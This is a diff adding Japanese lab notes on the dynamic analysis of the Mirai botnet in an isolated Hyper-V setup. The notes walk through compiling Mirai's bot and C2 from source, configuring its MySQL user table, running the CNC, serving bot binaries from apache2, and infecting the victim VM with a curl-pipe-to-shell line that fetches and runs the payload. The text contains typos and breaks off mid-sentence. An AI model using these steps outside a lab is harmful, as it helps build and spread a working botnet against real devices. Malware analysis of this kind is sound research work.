@@ -49,4 +49,129 @@ Miraiはマルウェアとしての知名度や影響度が大きいので解析
 **動的解析**とはその名の通り、検体を実際に動かしてその挙動を観察することです。
 安全に検体を動かせるよう、今回はHyper-V上に解析環境を構築します。
 
+解析環境の構築方法については手順を割愛しますが、構成は以下の通りです。
 
+- REMnux (C2サーバ)
+- CentOS (内部ルーター)
+- Ubuntu (Victim)
+
+1.
+必要なツールのインストール
+```
+sudo apt install gcc golang electric-fence mysql-server mysql-client screen dialog python3 apache2 -y
+```
+
+2.
+./mirai/debugフォルダー内にenc.cがある。これをコンパイルしてtable.cに入れる必要がある。
+mirai/ディレクトリで以下を実行してコンパイルする
+クロスコンパイル関連のエラー出ても無視してOK
+実行すると、mirai/debugフォルダーにencというコンパイル済みのバイナリが表示される
+```
+./build.sh debug telnet
+```
+
+3.
+
+
+## Miraiの方
+まずクロスコンパイラを設定する
+```
+sudo bash ./tools/compilers.sh
+```
+
+debugフォルダとreleaseフォルダを作成する
+```
+sudo bash ./setup.sh
+```
+
+これを実行すると、./mirai/deubgにencという名前の実行ファイルが作られる。
+```
+sudo bash ./build.sh debug telnet
+```
+
+botが接続するドメイン名の難読化などに使う
+例えば、
+
+```
+./debug/enc string example.com
+```
+![Alt text](image.png)
+
+
+### C2の設定
+mysql-serverを設定する
+```
+cat ./tools/db.sql | dsudo mysql
+sudo systemctl restart mysql
+```
+
+以下でmysql-serverにログインする
+```
+mysql -u root -p
+```
+
+USEステートメントでデータベースを選択する
+今回はmiraiというデータベースを操作
+```
+USE database_name;
+```
+
+以下を実行してmysqlのrootユーザーのパスワードを設定
+```
+INSERT INTO users VALUES (NULL, 'root', 'Nodaysoff！', 0, 0, 0, 0, -1, 1, 30, '');
+```
+
+./mirai/cnc/main.goを書き換える
+```go
+
+```
+![Alt text](image-2.png)
+
+## botとC2のビルド
+コンパイルする
+
+```
+bash ./build.sh debug telnet
+bash ./build.sh release telnet
+```
+
+
+## 実行
+c2を実行してmysqlの画面を開いて状態をリアルタイムで確認する
+```
+cd debug
+screen -S mirai-cnc sudo ./cnc
+```
+
+botを実行
+```
+cd debug
+screen -S mirai-bot sudo ./mirai.dbg
+```
+
+telnetでローカルホストにつなぎ、先ほどmysqlのrootアカウントに設定したパスワードを入力してC2のbotnetにログインする
+```
+tlenet localhost
+```
+![Alt text](image-3.png)
+![Alt text](image-4.png)
+
+
+?で攻撃のタイプを確認できる
+![Alt text](image-5.png)
+
+
+バイナリをapache2にインストールする
+```
+cd release
+sudo bash ../apache2.sh
+```
+上記によって、/var/www/html/binsにbot配布用のバイナリがつくられる
+
+![Alt text](image-6.png)
+
+Victim上で、curl http://<your apache2 ip>/bins/bins.sh |shして、バイナリをダウンロードおよび実行する
+
+![Alt text](image-7.png)
+
+dvrHelperがLinuxの実行ファイルであるELFであり、これは複数のバイナリを
